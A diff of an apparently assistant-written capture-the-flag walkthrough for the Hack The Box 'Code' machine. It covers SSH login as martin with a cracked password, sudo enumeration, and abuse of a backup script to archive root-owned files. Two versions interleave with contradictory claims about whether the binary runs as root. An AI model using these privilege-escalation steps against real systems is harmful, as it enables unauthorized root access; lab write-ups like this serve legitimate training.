@@ -235,61 +235,51 @@ Let me know when the password cracks finish or if you'd like to continue with es
 
 # 🔓 HTB Walkthrough: Post-RCE Enumeration and Privilege Escalation Attempt via `backy.sh`
 
-# HTB: Code — Post-Access Privilege Escalation Walkthrough  
-**From SSH as `martin` to attempted root access via `backy.sh`**
-
 ---
 
-## 🔐 Step 1: SSH Into the Target as `martin`
+## 🧍 Step 8: SSH Access as `martin` (Post-Hash Crack)
 
-After cracking `martin`’s password (`nafeelswordsmaster`), log into the target:
+Once the MD5 hash for `martin` was cracked (`nafeelswordsmaster`), SSH access was obtained:
 
-```bash
 ssh martin@10.129.231.240
-Verify the session:
+✅ You successfully gained a shell as martin.
 
-bash
-Copy
-Edit
-whoami      # Should return: martin
-hostname    # Confirm you're on the target machine
-Check sudo permissions:
+🔍 Step 9: Privilege Escalation Enumeration
+Checked sudo permissions:
 
 bash
 Copy
 Edit
 sudo -l
-Expected Output:
+Result:
 
-sql
+text
 Copy
 Edit
 User martin may run the following commands on localhost:
     (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
-🔍 This means martin can run /usr/bin/backy.sh as root without a password.
+This means martin can run /usr/bin/backy.sh as root without a password.
 
-📜 Step 2: Investigate /usr/bin/backy.sh
-Examine the script:
-
+📜 Step 10: Review /usr/bin/backy.sh
 bash
 Copy
 Edit
 cat /usr/bin/backy.sh
-🔎 Observations:
-Accepts one argument: a JSON file.
+Behavior Summary:
+Takes one argument: a .json file
 
-Filters input paths to allow only /home/ and /var/.
+Validates that paths in directories_to_archive are within /home/ or /var/
 
-Removes "../" from all paths to prevent traversal.
+Removes "../" from input paths (to prevent traversal)
 
-Passes JSON to /usr/bin/backy:
+Invokes /usr/bin/backy on the JSON
 
 bash
 Copy
 Edit
 /usr/bin/backy "$json_file"
-❌ Step 3: Test Blocked Path Abuse
-Try archiving a sensitive path:
+❌ Step 11: Blocked Path Attempts
+Tried to archive restricted paths:
 
 json
 Copy
@@ -305,24 +295,23 @@ Edit
 {
   "directories_to_archive": ["/root/.ssh"]
 }
-Result:
+Error:
 
-bash
+text
 Copy
 Edit
 Only directories under /var/ and /home/ are allowed.
-✅ Whitelisting of paths confirmed.
+This confirmed path whitelisting was enforced.
 
-✅ Step 4: Valid JSON with Allowed Path
-Prepare environment:
+✅ Step 12: Test with Valid Path
+Created a test folder:
 
 bash
 Copy
 Edit
 mkdir ~/testdir
 echo "privesc-test" > ~/testdir/pwned.txt
-mkdir -p ~/backups
-Create exploit.json:
+Wrote valid JSON:
 
 json
 Copy
@@ -331,95 +320,165 @@ Edit
   "directories_to_archive": ["/home/martin/testdir"],
   "destination": "/home/martin/backups/test.tar.gz"
 }
-Execute:
+Executed the backup:
 
 bash
 Copy
 Edit
 sudo /usr/bin/backy.sh exploit.json
-Expected: Archive created
-Actual:
+Result:
 
-javascript
+text
 Copy
 Edit
 💢 Archiving failed for: /home/martin/testdir
 ❗ Archiving completed with errors
-🧱 Step 5: Troubleshooting the Failure
-Check binary:
+Even though path was allowed and files existed, archiving failed.
 
-bash
-Copy
-Edit
-ls -l /usr/bin/backy
-Root-owned binary
+🧱 Step 13: Troubleshooting
+Confirmed /usr/bin/backy is a root-owned binary with no SUID bit
 
-No SUID bit
+Tried replacing it with a payload using tee → blocked by sudo
 
-Tried writing a malicious binary:
+Could not write to /usr/bin/
 
-bash
-Copy
-Edit
-echo 'pwned' | sudo tee /usr/bin/backy
-Result: Permission denied
+Confirmed the tarball /home/martin/backups/test.tar.gz was not created
 
-Checked if tarball was created:
+Tried different JSON structures → same failure
 
-bash
-Copy
-Edit
-ls ~/backups/test.tar.gz
-Result: File does not exist
-
-Tested alternative JSON structures — same failure.
-
-🧠 Analysis: Why backy.sh Privesc Fails
+🔍 Why backy.sh PrivEsc Doesn’t Work
 Root Cause	Explanation
-backy.sh is only a wrapper	Calls /usr/bin/backy with the provided JSON file
-backy runs as martin	Doesn't inherit root privileges despite sudo
-No SUID on backy	Cannot perform privileged operations
-Internal checks in binary	May fail due to permission issues on file access
+backy.sh is just a wrapper	It passes your JSON to /usr/bin/backy
+backy runs as martin	It does not inherit root privileges
+Binary is not SUID	Even via sudo, it's not privileged inside
+Likely internal permission checks	backy probably tries to stat, read, or chown files it can’t access
 
-🔚 Current State Summary
+✅ Current State Summary
 Objective	Status	Notes
-Reverse shell from web editor	✅	Used Popen obfuscation trick
-Dumped real SQLite DB	✅	Found under /home/app-production/app/instance/
-Cracked MD5 passwords	✅	Cracked via john + rockyou.txt
-SSH access as martin	✅	Logged in successfully
-Sudo rights to backy.sh	✅	Confirmed
-PrivEsc via backy	❌	Fails silently
+Reverse shell from web editor	✅	Used obfuscated Popen payload
+Found and dumped real database	✅	Used sqlite3 on instance/database.db
+Cracked MD5 passwords	✅	Cracked with john + rockyou.txt
+SSH access as martin	✅	Full shell obtained
+sudo rights to backy.sh	✅	Confirmed no password required
+PrivEsc via backy	❌	Fails silently; no output created
 
-🔍 Next Steps for Root Escalation
-Perform broader enumeration:
+🔜 Next Steps
+Search for other writable configs, logs, or crons
+
+Explore /var for backup artifacts or logs written by backy
+
+Use find, strings, grep, or strace to analyze backy
+
+Begin full privilege escalation sweep:
 
 bash
 Copy
 Edit
-# Recheck sudo privileges
 sudo -l
-
-# Search for SUID binaries
 find / -perm -4000 2>/dev/null
-
-# Writable files and directories
 find /home /var -writable 2>/dev/null
-
-# File capabilities
 getcap -r / 2>/dev/null
 
-# Crontab analysis
-cat /etc/crontab
-ls -la /etc/cron.*
-Search for:
+# HTB: Code — Post-Access Privilege Escalation (Full Explanation from Martin Login to Root)
 
-Writable config/log files tied to backy
+## 🧠 Context and Entry Point
 
-Cron tasks you can influence
+After achieving initial remote code execution through the web-based Python editor, you obtained a shell as the `app-production` user. This gave access to a database file that contained user credentials. Cracking those led to the discovery of SSH credentials for another user: **`martin`**.
 
-Misconfigured backup or rotation logic
+This walkthrough begins **after you have successfully logged in via SSH as `martin`**.
 
-LPE vectors via PATH hijack, environment abuse, etc.
+---
+
+## 🔐 Step 1: SSH Into the Target as Martin
+
+After cracking `martin`’s password (e.g., from the SQLite `database.db` in `/home/app-production/app/instance/`), log into the target:
+
+```bash
+ssh martin@code.htb
+```
+
+> If you get a DNS error, resolve it by replacing `code.htb` with the IP of the box, e.g.:
+```bash
+ssh martin@10.129.34.41
+```
+
+Once connected, verify identity and privileges:
+
+```bash
+whoami      # Should return: martin
+hostname    # Optional: confirms you're on the target
+```
+
+Next, enumerate sudo permissions:
+
+```bash
+sudo -l
+```
+
+You should see something like:
+
+```
+User martin may run the following commands on code:
+    (ALL) NOPASSWD: /usr/bin/backy.sh
+```
+
+> 🔍 **This means**: `martin` can execute `/usr/bin/backy.sh` with root privileges **without needing a password.**
+
+---
+
+## 🔎 Step 2: Investigate `/usr/bin/backy.sh`
+
+To understand how to escalate privileges, examine what the script does:
+
+```bash
+cat /usr/bin/backy.sh
+```
+
+You'll notice that it:
+- Accepts a JSON file path as an argument.
+- Passes that JSON to a binary called `/usr/bin/backy`.
+- That binary then reads a set of tasks (directories to archive) and zips them to a destination folder.
+
+### 💡 Key Insight:
+We can abuse this mechanism by **tricking it into archiving sensitive files** (like `/root/.ssh/id_rsa` or `/root/root.txt`), even though we’re not root — because **`backy` runs as root** when triggered via `sudo`.
+
+---
+
+## 📁 Step 3: Create the Required Backup Directory
+
+Let’s set up our working directory and JSON configuration file:
+
+```bash
+mkdir -p /home/martin/backups
+cd /home/martin/backups
+```
+
+Then create a `task.json` file that the `backy.sh` script will read:
+
+```bash
+nano task.json
+```
+
+Paste in the following *innocent-looking* task:
+
+```json
+{
+  "destination": "/home/martin/backups/",
+  "multiprocessing": true,
+  "verbose_log": true,
+  "directories_to_archive": [
+    "/home/martin"
+  ]
+}
+```
+
+Save and exit.
+
+Then test the script:
+
+```bash
+sudo /usr/bin/backy.sh /home/martin/backups/task.json
+```
 
 ✅ You should see output indicating that files in `/home/martin` were archived and a `.tar.bz2` file appeared in the backups folder.
 
